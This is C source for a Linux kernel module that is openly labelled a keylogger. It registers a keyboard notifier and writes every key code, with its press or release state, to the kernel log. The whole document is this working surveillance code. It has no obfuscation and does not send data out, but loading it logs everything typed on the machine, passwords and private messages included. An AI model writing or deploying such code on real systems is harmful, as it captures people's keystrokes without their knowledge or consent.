#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");

int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    struct vc_data *vc = param->vc;
  
    if (code == KBD_KEYCODE)
    {
        printk(KERN_ALERT "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = 
{
    .notifier_call = log_key
};

static int __init keylogger_init(void)
{
    register_keyboard_notifier(&nb);
    return 0;
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
